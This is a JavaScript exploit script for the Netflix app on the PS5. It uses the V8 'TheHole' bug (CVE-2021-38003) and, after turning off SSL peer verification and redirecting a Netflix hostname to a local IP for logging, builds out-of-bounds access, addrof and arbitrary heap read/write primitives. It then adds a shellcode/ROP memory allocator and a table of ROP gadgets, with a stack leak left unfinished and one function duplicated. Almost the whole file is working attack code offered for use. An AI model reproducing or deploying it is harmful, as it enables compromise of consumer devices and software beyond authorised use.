// Netflix PS5 Exploit
// based on https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
// thanks to Gezines y2jb for advice and reference : https://github.com/Gezine/Y2JB/blob/main/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY%3D/splash.html

(function() {
    var overlay = null;
    var lines = [];
    var maxLines = 40;
    var refreshTimer = null;
    
    
    function send_to_old_gen(){
        for (var i = 0; i < 10 ; i++){
                nrdp.gibbon.garbageCollect();
            }
    }
    
    function disable_gc(){ //yeah right lol
        time = -1 //9999999999
        nrdp.script.garbageCollectTimeout = time;
        nrdp.gibbon.garbageCollectTimeout = time;
        nrdp.options.garbage_collect_timeout = time;
    }
    
    var netlog = function(msg) {
        try {
            nrdp.gibbon.load({
                url: "https://pwn.netflix.com/?log=" + encodeURIComponent(msg),
                requestMethod: "GET",
                secure: false
            }, function() {});
        } catch (ex) {}
    };

    var log = function(msg) {
        netlog(msg);
        lines.push(msg);
        if (lines.length > maxLines) lines.shift();
        if (refreshTimer) nrdp.clearTimeout(refreshTimer);
        refreshTimer = nrdp.setTimeout(function() {
            refresh();
            refreshTimer = null;
        }, 50);
    };

    function refresh() {
        if (!overlay) return;
        if (overlay.children) {
            for (var j = overlay.children.length - 1; j >= 0; j--) {
                var child = overlay.children[j];
                if (child && child._name && child._name.startsWith("ln")) {
                    overlay.removeChild(child);
                }
            }
        }
        for (var i = 0; i < lines.length; i++) {
            var w = nrdp.gibbon.makeWidget({
                name: "ln" + i,
                x: 10,
                y: 10 + (i * 17),
                width: 1260,
                height: 15
            });
            w.text = {
                contents: lines[i],
                size: 12,
                color: {
                    a: 255,
                    r: 0,
                    g: 255,
                    b: 0
                },
                wrap: false
            };
            w.parent = overlay;
        }
    }

    overlay = nrdp.gibbon.makeWidget({
        name: "dbg",
        width: 1280,
        height: 720,
        backgroundColor: "#000000"
    });
    nrdp.gibbon.scene.overlay = overlay;

    nrdp.gibbon._runConsole("/command ssl-peer-verification false");
    nrdp.dns.set("pwn.netflix.com", nrdp.dns.A, {
        addresses: ["192.168.0.111"],
        ttl: 3600000
    });

    log("=== Netflix n Hack ===");

    try {

        disable_gc(); //yeah ok buddy

        nrdp.gibbon.garbageCollect();
        let array_buffer = new ArrayBuffer(0x8);
        let data_view = new DataView(array_buffer);

        function d2u(value) {
            data_view.setFloat64(0, value);
            return data_view.getBigUint64(0);
        }

        function u2d(value) {
            data_view.setBigUint64(0, value);
            return data_view.getFloat64(0);
        }

        function toHex(num) {
            var str = num.toString(16);
            while (str.length < 16) str = "0" + str;
            return "0x" + str;
        }

        // Retry loop for spray/corruption
        var exploit_ready = false;
        for (var attempt = 1; attempt <= 10; attempt++) {
            try {
                log('');
                log('=== Attempt ' + attempt + ' ===');

        // TheHole leak
        function trigger() {
            let v1;

            function f0(v4) {
                v4(() => {}, v5 => {
                    v1 = v5.errors;
                });
            }
            f0.resolve = (v6) => {
                return v6;
            };
            let v3 = {
                then(v7, v8) {
                    v8();
                }
            };
            Promise.any.call(f0, [v3]);
            return v1[1];
        }

        
        
        var map1 = null;
        var oob_arr = null;

        var hole = trigger();
        
        //https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-rce-183dcb6f3078
        function getmap(m) {
            
            m = new Map();
            m.set(1, 1);
            m.set(hole, 1);
            m.delete(hole);
            m.delete(hole);
            m.delete(1);
            return m;
        }
        
        for (let i = 0; i < 0x3000; i++) {
            map1 = getmap(map1);
            oob_arr = Array(1.1, 1.1);//1.1=3ff199999999999a
            victim_arr = Array(2.2, 3.3, 4.4, 5.5);
            obj_arr = [{}, {}, {}, {}];
            
        }
        

        log("map.size = " + map1.size)
        //log('2.2 = ' + toHex(d2u(2.2)))
        //log('3.3 = ' + toHex(d2u(3.3)))
        map1.set(0x10, -1);
        
        nrdp.gibbon.garbageCollect();//gc()
        map1.set(oob_arr, 0xffff);

        
    
        // Aliases for d2u/u2d
        var ftoi = d2u;
        var itof = u2d;

        // Find victim_arr elements pointer
        var victim_data_offset = -1;
        var marker_2_2 = d2u(2.2);

        for (let i = 0; i < 100; i++) {
            if (d2u(oob_arr[i]) === marker_2_2) {
                victim_data_offset = i;
                break;
            }
        }

        if (victim_data_offset === -1) {
            throw new Error('Could not find victim_arr - retrying...');
        }

        // Elements pointer is 2 offsets before the data
        var victim_elements_offset = victim_data_offset - 2;
        var ori_victim_arr_elem = ftoi(oob_arr[victim_elements_offset]) & 0xffffffffn;

        log('victim_arr data @ oob[' + victim_data_offset + ']');
        log('victim_arr elements @ oob[' + victim_elements_offset + ']');

        // Find obj_arr elements pointer
        // obj_arr was created right after victim_arr, so search after victim_arr
        var obj_elements_offset = -1;

        // Look for obj_arr structure by examining patterns after victim_arr
        // obj_arr has 4 object pointers, look for compressed pointers pattern
        for (let i = victim_data_offset + 4; i < victim_data_offset + 30; i++) {
            var val = ftoi(oob_arr[i]);
            var low32 = val & 0xffffffffn;
            var high32 = val >> 32n;

            // Check if this looks like it could be elements pointer
            // (compressed pointer in low 32 bits, size/flags in high 32)
            if (high32 >= 4n && high32 <= 0x100n && low32 > 0x1000n && low32 < 0x10000000n) {
                // Verify next offset has object pointers
                var next_val = ftoi(oob_arr[i + 2]);
                var next_low = next_val & 0xffffffffn;
                var next_high = next_val >> 32n;

                if (next_low > 0x1000n && next_high > 0x1000n) {
                    obj_elements_offset = i;
                    log('obj_arr elements @ oob[' + i + ']');
                    break;
                }
            }
        }

        if (obj_elements_offset === -1) {
            throw new Error('Could not find obj_arr - retrying...');
        }

        // Success! Break out of retry loop
        exploit_ready = true;
        break;

            } catch (e) {
                log('Attempt ' + attempt + ' failed: ' + e.message);
                if (attempt === 10) {
                    log('All attempts failed!');
                    return;
                }
            }
        } // end retry loop

        if (!exploit_ready) {
            log('ERROR: Could not get primitives after 10 attempts');
            return;
        }

        //log('Exploit primitives ready!');
        
        /*
         * addrof primitive
         * Modify the element pointer of victim_arr & obj_arr, make them point to same memory
         * Then put object in obj_arr[0] and read its address with victim_arr[0]
         *
         * @param {object} o Target object
         * @return {BigInt} address of the target object
         * */
        function addrof(o) {
            oob_arr[victim_elements_offset] = itof((0x8n << 32n) | ori_victim_arr_elem);
            oob_arr[obj_elements_offset] = itof((0x8n << 32n) | ori_victim_arr_elem);
            obj_arr[0] = o;
            return ftoi(victim_arr[0]) & 0xffffffffn;
        }

        /*
         * arbitrary V8 heap read primitive
         * Modify the element pointer of victim_arr
         * Use victim_arr[0] to read 64 bit content from V8 heap
         *
         * @param {BigInt} addr Target V8 heap address
         * @return {BigInt} 64 bit content of the target address
         * */
        function heap_read64(addr) {
            oob_arr[victim_elements_offset] = itof((0x8n << 32n) | (addr - 0x8n)); // set victim_arr's element pointer & size. Have to -8 so victim_arr[0] can points to addr
            return ftoi(victim_arr[0]);
        }

        /*
         * arbitrary V8 heap write primitive
         * Use the same method in heap_read64 to modify pointer
         * Then victim_arr[0] to write 64 bit content to V8 heap
         *
         * @param {BigInt} addr Target V8 heap address
         * @param {BigInt} val Written value
         * */
        function heap_write64(addr, val) {
            oob_arr[victim_elements_offset] = itof((0x8n << 32n) | (addr - 0x8n)); // set victim_arr's element pointer & size. Have to -8 so victim_arr[0] can points to addr
            victim_arr[0] = itof(val);
        }

        // Test addrof
        log('');
        log('Testing addrof...');
        var test_obj1 = {a: 1};
        var test_obj2 = {b: 2};

        var addr1 = addrof(test_obj1);
        var addr2 = addrof(test_obj2);

        log('  obj1 @ ' + toHex(addr1));
        log('  obj2 @ ' + toHex(addr2));

        if (addr1 !== 0n && addr2 !== 0n && addr1 !== addr2) {
            log('  addrof: PASS');
        } else {
            log('  addrof: FAIL');
            log('    addr1 === 0: ' + (addr1 === 0n));
            log('    addr2 === 0: ' + (addr2 === 0n));
            log('    addr1 === addr2: ' + (addr1 === addr2));
        }

        // Test heap_read64/heap_write64
        log('');
        log('Testing heap_read64/heap_write64...');
        var test_obj3 = {x: 123};
        var addr3 = addrof(test_obj3);

        // Read the object's map pointer (at offset 0)
        var map_val = heap_read64(addr3);
        log('  obj3 @ ' + toHex(addr3));
        log('  map @ +0x0: ' + toHex(map_val));

        // Read at offset +0x8
        var val_8 = heap_read64(addr3 + 0x8n);
        log('  value @ +0x8: ' + toHex(val_8));

        // Test write: save original, write test value, read back, restore
        var original = heap_read64(addr3 + 0x8n);
        heap_write64(addr3 + 0x8n, 0xdeadbeefcafebaben);
        var written = heap_read64(addr3 + 0x8n);
        heap_write64(addr3 + 0x8n, original);
        var restored = heap_read64(addr3 + 0x8n);

        log('  write test:');
        log('    original: ' + toHex(original));
        log('    written:  ' + toHex(written));
        log('    restored: ' + toHex(restored));

        if (written === 0xdeadbeefcafebaben && restored === original) {
            log('  heap_read64/heap_write64: PASS');
        } else {
            log('  heap_read64/heap_write64: FAIL');
        }

        // Arbitrary read/write primitive using DataView
        log('');
        log('Building arbitrary read/write...');

        var dv = new DataView(new ArrayBuffer(0x1000)); // typed array used for arbitrary read/write
        var dv_addr = addrof(dv);
        var dv_buffer = heap_read64(dv_addr + 0xcn); // dv_addr + 0xc = DataView->buffer

        log('  DataView @ ' + toHex(dv_addr));
        log('  Buffer @ ' + toHex(dv_buffer));

        /*
         * Set DataView's backing store pointer, so later we can use dv to achieve arbitrary read/write
         * @param {BigInt} addr Target address to read/write
         * */
        function set_dv_backing_store(addr) {
            heap_write64(dv_buffer + 0x1cn, addr); // dv_buffer+0x1c == DataView->buffer->backing store pointer
        }

        log('  Arbitrary read/write ready');

        // malloc - allocate memory and return backing store address
        var allocated_buffers = [];

        /*
         * Allocate memory for ROP chain / shellcode
         * @param {Number} size Size to allocate in bytes
         * @return {BigInt} Address of allocated memory
         * */
        function malloc(size) {
            var buffer = new ArrayBuffer(size);
            var buffer_addr = addrof(buffer);
            var backing_store = heap_read64(buffer_addr + 0x1cn); // buffer+0x1c = backing_store pointer

            // Keep reference so GC doesn't free it
            allocated_buffers.push(buffer);

            return backing_store;
        }

        // malloc - allocate memory and return backing store address
        var allocated_buffers = [];

        /*
         * Allocate memory for ROP chain / shellcode
         * @param {Number} size Size to allocate in bytes
         * @return {BigInt} Address of allocated memory
         * */
        function malloc(size) {
            var buffer = new ArrayBuffer(size);
            var buffer_addr = addrof(buffer);
            var backing_store = heap_read64(buffer_addr + 0x1cn); // buffer+0x1c = backing_store pointer

            // Keep reference so GC doesn't free it
            allocated_buffers.push(buffer);

            return backing_store;
        }

        // Test malloc
        log('');
        log('Testing malloc...');

        var rop_addr = malloc(0x1000);
        log('  Allocated 0x1000 bytes @ ' + toHex(rop_addr));

        // Test writing to allocated memory
        set_dv_backing_store(rop_addr);
        dv.setBigUint64(0, 0x4141414141414141n, true);
        dv.setBigUint64(8, 0x4242424242424242n, true);
        dv.setBigUint64(16, 0x4343434343434343n, true);

        // Read back
        var val0 = dv.getBigUint64(0, true);
        var val8 = dv.getBigUint64(8, true);
        var val16 = dv.getBigUint64(16, true);

        log('  Wrote test pattern');
        log('  Read back: ' + toHex(val0) + ', ' + toHex(val8) + ', ' + toHex(val16));

        if (val0 === 0x4141414141414141n && val8 === 0x4242424242424242n && val16 === 0x4343434343434343n) {
            log('  malloc: PASS');
        } else {
            log('  malloc: FAIL');
        }

        // ROP gadgets
        log('');
        log('Setting up ROP gadgets...');

        var eboot_base = 0x400000n; //will find this later
        var gadgets = {
            pop_rax: eboot_base + 0x518dn,
            pop_rdi: eboot_base + 0x12333n,
            pop_rsi: eboot_base + 0x664en,
            pop_rdx: eboot_base + 0x6035cfn,
            pop_rcx: eboot_base + 0x58a7n,
            pop_rbp: eboot_base + 0x69n,              // pop rbp ; ret
            pop_rsp: eboot_base + 0x231f7can,         // pop rsp ; ret
            mov_rdi_rax: eboot_base + 0x8edb65n,      // mov qword [rdi], rax ; ret
            syscall: eboot_base + 0x41a3n,
            ret: eboot_base + 0x518en
        };

        //~ log('  eboot_base: ' + toHex(eboot_base));
        //~ log('  pop_rdi: ' + toHex(gadgets.pop_rdi));
        //~ log('  pop_rsi: ' + toHex(gadgets.pop_rsi));
        //~ log('  pop_rdx: ' + toHex(gadgets.pop_rdx));
        //~ log('  syscall: ' + toHex(gadgets.syscall));

        // Stack leak via bytecode patching (Ldar a0, Return)
        log('');
        log('Leaking stack address...');

        function pwn(x) {
            let dummy1 = x + 1;
            let dummy2 = x + 2;
            let dummy3 = x + 3;
            let dummy4 = x + 4;
            let dummy5 = x + 5;
            return x;
        }

        pwn(1); // Generate bytecode

        var pwn_addr = addrof(pwn);
        var pwn_val1 = heap_read64(pwn_addr + 0x18n);
        var pwn_sfi = (pwn_val1 & 0xFFFFFFFFn) !== 0n ? (pwn_val1 & 0xFFFFFFFFn) : (pwn_val1 >> 32n); //pointer compression
        var pwn_val2 = heap_read64(pwn_sfi + 0x8n);
        var bytecode_addr = (pwn_val2 & 0xFFFFFFFFn) !== 0n ? (pwn_val2 & 0xFFFFFFFFn) : (pwn_val2 >> 32n);

        var bc_start = bytecode_addr + 0x36n;

        log('  BC @ ' + toHex(bytecode_addr));
        log('  BC start @ ' + toHex(bc_start));

        // Read original bytecode
        var orig_bc = heap_read64(bc_start);
        log('  Original BC: ' + toHex(orig_bc));

        // Skip stack leak for now - bytecode patching approach doesn't work on this V8 version
        // V8 validates return values and crashes when we return raw stack data
        log('  Skipping stack leak for now');

        

     


    } catch (e) {
        log("EXCEPTION: " + e.message);
        log(e.stack);
    }

})();